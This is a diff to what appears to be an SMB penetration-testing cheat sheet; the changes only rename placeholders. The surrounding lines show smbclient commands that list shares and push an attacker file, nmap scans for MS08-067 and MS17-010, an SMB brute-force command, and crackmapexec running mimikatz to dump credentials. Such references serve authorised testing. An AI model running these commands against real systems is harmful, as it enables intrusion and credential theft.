@@ -25,13 +25,13 @@ smbclient //<target>/<share> -c 'ls' <password> -U <username>
 smbclient //<target>/<share> -c 'cd <folder>; ls' <password> -U <username>
 
 # Download a file from a specific share folder
-smbclient //<target>/<share> -c 'cd <folder>;get <desired_file_name>' <password> -U <username>
+smbclient //<target>/<share> -c 'cd <folder>;get <desired-file-name>' <password> -U <username>
 
 # Copy a file to a specific share folder
-smbclient //<target>/<share> -c 'put <attacker file> .\<remote file with backslashes>' <password> -U <username>
+smbclient //<target>/<share> -c 'put <attacker file> .\<remote-file-with-backslashes>' <password> -U <username>
 
 # Create a folder in a specific share folder
-smbclient //<target>/<share> -c 'mkdir .\<remote folder with backslashes>' <password> -U <username>
+smbclient //<target>/<share> -c 'mkdir .\<remote-folder-with-backslashes>' <password> -U <username>
 
 # Rename a file in a specific share folder
 smbclient //<target>/<share> -c 'rename <current file> <new file>' <password> -U <username>
@@ -82,7 +82,7 @@ nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=<username>,s
 nmap -p 445 --script smb-vuln-ms06-025 --script smb-vuln-ms07-029 --script smb-vuln-ms08-067 --script smb-vuln-ms10-054 --script smb-vuln-ms10-061 --script smb-vuln-ms17-010 <target>
 
 # map - Brute Force Accounts (be aware of account lockout!)
-nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt <target>
+nmap –p 445 --script smb-brute –script-args userdb=<user-list.txt>,passdb=<pass-list.txt> <target>
 
 # using mimikatz with cme
 crackmapexec smb <target> -u <username> -p '<password>' -M mimikatz
